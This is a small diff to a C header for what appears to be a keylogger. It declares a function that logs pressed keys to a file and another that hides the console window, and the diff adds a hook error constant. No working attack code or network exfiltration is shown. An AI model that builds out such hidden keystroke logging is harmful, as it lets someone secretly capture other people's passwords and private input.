@@ -5,6 +5,8 @@
 
 #pragma once
 
+#define SET_HOOK_ERROR -1
+
  /**
   * @brief Log pressed keys to a file.
   *
@@ -13,7 +15,7 @@
   * @param outFileName The name of the output file to log keys.
   * @return An error code indicating the success or failure of the operation.
   */
-errno_t logKeys(const char* outFileName);
+const errno_t logKeys(const char *outFileName);
 
 /**
  * @brief Hide the console window.
